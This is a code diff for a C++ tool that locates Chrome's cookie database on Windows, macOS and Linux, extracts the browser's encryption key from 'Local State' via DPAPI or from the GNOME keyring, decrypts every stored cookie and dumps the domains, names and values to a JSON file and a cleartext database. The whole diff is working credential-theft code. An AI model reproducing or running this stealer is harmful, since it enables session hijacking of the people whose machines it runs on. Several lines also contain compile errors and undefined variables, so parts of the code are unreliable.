@@ -6,9 +6,12 @@
 #include <iostream> 
 #include <memory>
 
-#include <sqlite3.h>  
+#include <sqlite3.h>
+#include <jsoncons/json.hpp>
+#include <fstream>
 
 #ifdef _WIN32
+    #include "base64.hpp"
     #include <Windows.h>
     #include <Lmcons.h>
     #pragma comment(lib, "ws2_32.lib")
@@ -29,22 +32,27 @@
 
 #define KEY_LEN      16
 
+#ifdef _WIN32
+// old "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies"
+#define CHROME_COOKIES_PATH "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"
+#elif __APPLE_
+#define CHROME_COOKIES_PATH "%s/Library/Application Support/Google/Chrome/Default/Cookies"
+#elif __linux__
+#define CHROME_COOKIES_PATH "%s/.config/google-chrome/Default/Cookies"
+#endif //_WIN32
+
 static bool quiet = false;
 
-using namespace std;
+using cookie_vector_t = std::vector<std::tuple<std::string, std::string, std::vector<unsigned char>, std::string>>;
 
-
-vector<tuple<string, string, vector<unsigned char>, string>> get_encrypted_cookies_vector(const char* db_path) {
+cookie_vector_t get_encrypted_cookies_vector(const char* db_path) {
     
     sqlite3* DB;
-    auto sol_vector = vector<tuple<string, string, vector<unsigned char>, string>>();
+    auto sol_vector = cookie_vector_t();
 
-    int exit = 0;
-    exit = sqlite3_open(db_path, &DB);
-
-    if (exit) {
+    if (sqlite3_open_v2(db_path, &DB, SQLITE_OPEN_READONLY, NULL)) {
         std::cerr << "Error open DB " << sqlite3_errmsg(DB) << std::endl;
-        return sol_vector;
+        exit(-1);
     }
     else
         std::cout << "Opened Database Successfully!" << std::endl;
@@ -56,7 +64,7 @@ vector<tuple<string, string, vector<unsigned char>, string>> get_encrypted_cooki
     if (sqlite3_prepare_v2(DB, sql, strlen(sql), &statement, 0) != SQLITE_OK)
     {
         printf("Open database failed\n");
-        return sol_vector;
+        exit(-1);
     }
 
     int result = 0;
@@ -67,7 +75,6 @@ vector<tuple<string, string, vector<unsigned char>, string>> get_encrypted_cooki
         if (result == SQLITE_ROW)
         {
             const char* host_key = (const char*)sqlite3_column_text(statement, 0);
-
             const char* cookie_name = (const char*)sqlite3_column_text(statement, 1);
 
             // Get the size of the vector
@@ -79,19 +86,16 @@ vector<tuple<string, string, vector<unsigned char>, string>> get_encrypted_cooki
             unsigned char* p = (unsigned char*)sqlite3_column_blob(statement, 2);
 
             // Initialize the vector with the data
-            vector<unsigned char> encrypted_value(p, p + size);         
+            std::vector<unsigned char> encrypted_value(p, p + size);
 
-#ifndef _WIN32
-            string signature(encrypted_value.begin(), encrypted_value.begin() + 3);
+            std::string signature(encrypted_value.begin(), encrypted_value.begin() + 3);
             if (signature == "v10" || signature == "v11") {
                 encrypted_value.erase(encrypted_value.begin(), encrypted_value.begin() + 3);
                 sol_vector.push_back(make_tuple(host_key, cookie_name, encrypted_value, ""));
-        }
-#else
-            sol_vector.push_back(make_tuple(host_key, cookie_name, encrypted_value, ""));
-#endif // !_WIN32
-
-            
+            }
+            else {
+                std::cout << "[!] Encrypted cookies does not have v10 or v11 magic header" << std::endl;
+            }
 
         }
         else
@@ -132,53 +136,48 @@ SecretValue* ToSingleSecret(GList* secret_items) {
 #endif
 
 
+void aes_init()
+{
+    static int init = 0;
+    if (init == 0)
+    {
+        //EVP_CIPHER_CTX e_ctx, d_ctx;
 
-#ifndef _WIN32
-string get_key() {
-#ifdef __APPLE_
-
-#elif __linux__
-    const SecretSchema kKeystoreSchemaV2 = {
-        "chrome_libsecret_os_crypt_password_v2",
-        SECRET_SCHEMA_DONT_MATCH_NAME,
-        {
-            {"application", SECRET_SCHEMA_ATTRIBUTE_STRING},
-            {nullptr, SECRET_SCHEMA_ATTRIBUTE_STRING},
-        }
-    };
-
-    GHashTable* attrs;
-    attrs = g_hash_table_new_full(g_str_hash, g_str_equal,
-        nullptr,   // no deleter for keys
-        nullptr);  // no deleter for values
-    Append(attrs, "application", "chrome");
-
-    GError* error_ = nullptr;
-
-    GList* results_ = nullptr;
-    results_ = secret_service_search_sync(nullptr,  // default secret service
-        &kKeystoreSchemaV2, attrs, static_cast<SecretSearchFlags>(SECRET_SEARCH_UNLOCK | SECRET_SEARCH_LOAD_SECRETS),
-        nullptr,  // no cancellable object
-        &error_);
-
-    SecretValue * password_libsecret = ToSingleSecret(results_);
-    if (password_libsecret == nullptr) {
-        printf("[!] Error accessing gnome keyring. Is the user logged in (check who)?\n");
-        return "";
+        //initialize openssl ciphers
+        OpenSSL_add_all_ciphers();
     }
+}
 
+std::string aes_256_gcm_decrypt(std::vector<unsigned char> ciphertext, std::string key)
+{
 
-    std::string key(secret_value_get_text(password_libsecret));
+    constexpr size_t kNonceLength = 12;
 
-    printf("The Key is %s\n", key.c_str());
-    return key;
+    unsigned char tag[AES_BLOCK_SIZE];
+    unsigned char nonce[kNonceLength];
 
-#endif // DEBUG
+    std::copy(ciphertext.begin(), ciphertext.begin() + 12, nonce);
+    std::copy(ciphertext.end() - 16, ciphertext.end(), tag);
 
-    return "";
+    std::vector<unsigned char> plaintext;
+    plaintext.resize(ciphertext.size(), '\0');
+
+    int actual_size = 0, final_size = 0;
+    EVP_CIPHER_CTX* d_ctx = EVP_CIPHER_CTX_new();
+    auto a = EVP_DecryptInit(d_ctx, EVP_aes_256_gcm(), (const unsigned char*)key.c_str(), nonce);
+    auto b = EVP_DecryptUpdate(d_ctx, &plaintext[0], &actual_size, &ciphertext[kNonceLength], ciphertext.size()  - sizeof(tag) - sizeof(nonce));
+    auto c = EVP_CIPHER_CTX_ctrl(d_ctx, EVP_CTRL_GCM_SET_TAG, 16, tag);
+    if (!EVP_DecryptFinal(d_ctx, &plaintext[actual_size], &final_size)) {
+        std::cout << "[!] Error decrypting cookie" << std::endl;
+    }
+    EVP_CIPHER_CTX_free(d_ctx);
+    plaintext.resize(actual_size + final_size, '\0');
+
+    return std::string(plaintext.begin(), plaintext.end());
 }
 
 
+#ifndef _WIN32
 string derive_key(string pwd)
 {
     size_t i;
@@ -235,31 +234,88 @@ std::string AES_Decrypt_String(std::string const& data, std::string const& key, 
 }
 #endif
 
-void decrypt_cookies(vector<tuple<string, string, vector<unsigned char>, string>>* cookie_vector) {
+std::string get_key() {
 #ifdef _WIN32
-    for (auto& [host_key, cookie_name, encrypted_value, decrypted_value] : *cookie_vector) {
+    char username[UNLEN + 1];
+    DWORD username_len = UNLEN + 1;
+    GetUserName(username, &username_len);
+    char cookies_path[MAX_PATH] = { 0 };
+    //snprintf(cookies_path, MAX_PATH, "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies", username);
+    snprintf(cookies_path, MAX_PATH, "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", username);
+    //"C:\Users\defaul\AppData\Local\Google\Chrome\User Data\Local State"
+    std::ifstream is(cookies_path);
+    
+    if (!is.is_open()) {
+        std::cout << "Error opening " << cookies_path << std::endl;
+        return "";
+    }
+    
+    try
+    {
+        jsoncons::json j = jsoncons::json::parse(is);
+        auto encrypted_key = j["os_crypt"]["encrypted_key"].as<std::string>();
+        
+        auto decoded = base64_decode(encrypted_key);
+        decoded.erase(decoded.begin(), decoded.begin() + 5);
+
         DATA_BLOB input;
-        string plaintext;
+        std::string plaintext;
         input.pbData = const_cast<BYTE*>(
-            reinterpret_cast<const BYTE*>(encrypted_value.data()));
-        input.cbData = static_cast<DWORD>(encrypted_value.size());
+            reinterpret_cast<const BYTE*>(decoded.data()));
+        input.cbData = static_cast<DWORD>(decoded.size());
 
         DATA_BLOB output;
-        BOOL result = CryptUnprotectData(&input, nullptr, nullptr, nullptr, nullptr,
-            0, &output);
-
-        decrypted_value.assign(reinterpret_cast<char*>(output.pbData), output.cbData);
-        LocalFree(output.pbData);
-
-        if (!quiet){
-            std::cout << "host key: " << host_key << " cookie_name: " << cookie_name;
-            std::cout << " decrypted_cookie: " << decrypted_value << endl;
+        if (!CryptUnprotectData(&input, nullptr, nullptr, nullptr, nullptr,
+            0, &output)) {
+            std::cout << "[!] CryptUnprotectData failed decrypting encrypted_key" << std::endl;
+            return "";
         }
+        return std::string(reinterpret_cast<char*>(output.pbData), output.cbData);
+
+    }
+    catch (const jsoncons::ser_error& e)
+    {
+        std::cout << e.what() << std::endl;
+        return "";
+    }
+    
+
+#elif __APPLE_
+
+#elif __linux__
+    const SecretSchema kKeystoreSchemaV2 = {
+        "chrome_libsecret_os_crypt_password_v2",
+        SECRET_SCHEMA_DONT_MATCH_NAME,
+        {
+            {"application", SECRET_SCHEMA_ATTRIBUTE_STRING},
+            {nullptr, SECRET_SCHEMA_ATTRIBUTE_STRING},
+        }
+    };
+
+    GHashTable* attrs;
+    attrs = g_hash_table_new_full(g_str_hash, g_str_equal,
+        nullptr,   // no deleter for keys
+        nullptr);  // no deleter for values
+    Append(attrs, "application", "chrome");
+
+    GError* error_ = nullptr;
+
+    GList* results_ = nullptr;
+    results_ = secret_service_search_sync(nullptr,  // default secret service
+        &kKeystoreSchemaV2, attrs, static_cast<SecretSearchFlags>(SECRET_SEARCH_UNLOCK | SECRET_SEARCH_LOAD_SECRETS),
+        nullptr,  // no cancellable object
+        &error_);
+
+    SecretValue * password_libsecret = ToSingleSecret(results_);
+    if (password_libsecret == nullptr) {
+        std::cout < "[!] Error accessing gnome keyring. Is the user logged in (check who)?\n" << std::endl;
+        return "";
     }
 
-#else
-    // Get key. this is OS dependent
-    auto key = get_key();
+
+    std::string key(secret_value_get_text(password_libsecret));
+
+    printf("The Key is %s\n", key.c_str());
 
     // Derive key to get encryption key
     //auto derived_key = derive_key(key);
@@ -269,19 +325,48 @@ void decrypt_cookies(vector<tuple<string, string, vector<unsigned char>, string>
         // error
         return;
     }
+    return derived_key;
+    
+#endif
+    return "";
+}
 
+std::string decryptCookie(std::vector<unsigned char> ciphertext, std::string encryptionKey) {
+#ifdef _WIN32
+    return aes_256_gcm_decrypt(ciphertext, encryptionKey);
+#else
+    return AES_Decrypt_String(std::string(ciphertext.begin(), ciphertext.end()), encryptionKey, std::vector<unsigned char>(AES_BLOCK_SIZE, 0x20));
+#endif
+}
+
+void decrypt_cookies(cookie_vector_t* cookie_vector)
+{
+    jsoncons::json allCookies(jsoncons::json_array_arg);
+
+    // Get key. This is OS dependent
+    auto encryptionKey = get_key();
     for (auto& [host_key, cookie_name, encrypted_value, decrypted_value] : *cookie_vector) {
-        std::cout << "host key: " << host_key << " cookie_name: " << cookie_name;
-
-        decrypted_value = AES_Decrypt_String(std::string(encrypted_value.begin(), encrypted_value.end()), derived_key, std::vector<unsigned char>(AES_BLOCK_SIZE, 0x20));
-
-        std::cout << " decrypted_cookie: " << decrypted_value << endl;
+        decrypted_value = decryptCookie(encrypted_value, encryptionKey);
+        
+        jsoncons::json cookieJSON;
+        cookieJSON["domain"] = host_key;
+        cookieJSON["name"] = cookie_name;
+        cookieJSON["value"] = decrypted_value;
+        allCookies.push_back(std::move(cookieJSON));
     }
-#endif // _WIN32
+
+    if (!quiet) {
+        std::cout << jsoncons::pretty_print(allCookies) << std::endl;
+    }
+    
+    std::ofstream fsi("test.json");
+    allCookies.dump_pretty(fsi);
+    fsi.close(); 
+    
 }
 
 
-int update_decrypted_DB(vector<tuple<string, string, vector<unsigned char>, string>> cookie_vector, char* db_path) {
+int update_decrypted_DB(cookie_vector_t cookie_vector, char* db_path) {
     sqlite3* DB;
     
     char sql[4000];
@@ -292,7 +377,7 @@ int update_decrypted_DB(vector<tuple<string, string, vector<unsigned char>, stri
 
     if (exit) {
         std::cerr << "Error open DB " << sqlite3_errmsg(DB) << std::endl;
-        return 1;
+        return -1;
     }
     else
         std::cout << "Updating DB rows with decrypted values. This may take a while..." << std::endl;
@@ -320,23 +405,25 @@ int main(int argc, char** argv) {
     DWORD username_len = UNLEN + 1;
     GetUserName(username, &username_len);
     char cookies_path[MAX_PATH] = {0};
-    snprintf(cookies_path, MAX_PATH, "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies", username);
-#elif __APPLE_
+    snprintf(cookies_path, MAX_PATH, CHROME_COOKIES_PATH, username);
+#else
     char cookies_path[PATH_MAX] = {0};
     auto home = getenv("HOME");
-    snprintf(cookies_path, PATH_MAX, "%s/Library/Application Support/Google/Chrome/Default/Cookies", home);
-#elif __linux__
-    char cookies_path[PATH_MAX] = {0};
-    auto home = getenv("HOME");
-    snprintf(cookies_path, PATH_MAX, "%s/.config/google-chrome/Default/Cookies", home);
+    snprintf(cookies_path, PATH_MAX, CHROME_COOKIES_PATH, home);
 #endif //_WIN32
 
-    std::filesystem::copy(cookies_path, "Cookies_decrypted", std::filesystem::copy_options::overwrite_existing);
+    std::error_code err;
+    std::filesystem::copy(cookies_path, "Cookies_decrypted", std::filesystem::copy_options::overwrite_existing, err);
 
-    auto cookies_vector = get_encrypted_cookies_vector(cookies_path);
+    if (err) {
+        std::cout << err.message() << std::endl;
+        return -1;
+    }
+
+    auto cookies_vector = get_encrypted_cookies_vector("Cookies_decrypted");
     
     if (cookies_vector.empty()) {
-    //error
+        std::cout << "[!] Couldn't get cookies values" << std::endl;
         return -1;
     }
 
@@ -344,8 +431,12 @@ int main(int argc, char** argv) {
 
     // Update Cookies_decrypted with the decrypted values of the cookies
     if (update_decrypted_DB(cookies_vector, "Cookies_decrypted") == 0) {
-        cout << "Database has been properly created with decrypted values" << endl;
+        std::cout << "Database has been properly created with decrypted values" << std::endl;
+    }
+    else {
+        std::cout << "[!!] Some error occured while creating cleartext Cookies DB" << std::endl;
+        return -1;
     }
 
-    
+    return 0;
 }
